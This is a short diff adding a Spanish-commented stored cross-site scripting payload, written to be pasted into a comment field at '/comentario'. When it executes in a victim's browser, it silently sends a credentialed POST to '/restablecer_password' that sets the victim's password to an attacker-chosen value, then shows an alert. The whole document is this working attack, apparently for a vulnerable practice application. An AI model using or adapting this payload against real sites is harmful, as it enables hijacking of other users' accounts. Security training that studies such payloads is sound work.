@@ -1,0 +1,17 @@
+
+// este código puede ser pegado en el campo de input de '/comentario' para restablecer la contraseña
+<script>
+    function restablecerPassword() {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "/restablecer_password", true);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    
+                // Contraseña Maliciosa
+                var nueva_password = "Contraseña_nueva";
+                xhr.send("nueva_password=" + nueva_password);  // Inyección directa sin sanitización
+                
+                alert("La contraseña ha sido restablecida!");
+            }
+            restablecerPassword();
+    </script>
